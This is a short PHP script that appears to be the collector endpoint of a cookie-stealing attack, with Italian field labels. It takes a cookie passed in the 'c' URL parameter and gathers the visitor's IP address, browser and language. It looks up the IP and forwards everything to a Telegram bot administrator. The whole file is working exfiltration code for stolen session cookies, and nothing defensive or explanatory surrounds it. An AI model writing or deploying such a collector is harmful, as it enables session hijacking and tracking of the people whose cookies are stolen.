<?php
require('telegramapi.php');
require('config.php');
require('ipapi.php');

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$accept=$_SERVER['HTTP_ACCEPT_LANGUAGE'];
$cookie = $_GET['c'];
$today = date("l, F j, Y, g:i a") ;
$script_url = $_SERVER['SCRIPT_URI'];
echo $script_url;


$message = "
Ip: $ip\n
Cookie: $cookie\n
Browser: $userAgent\n
Lingua: $accept\n
Url: $base\n
Giorno & Ora : $today \n
";

echo $message;
//$ip_query = ip2($ip);
get_ip_info($ip);
sendMessage($bot_admin_id, $message);


?>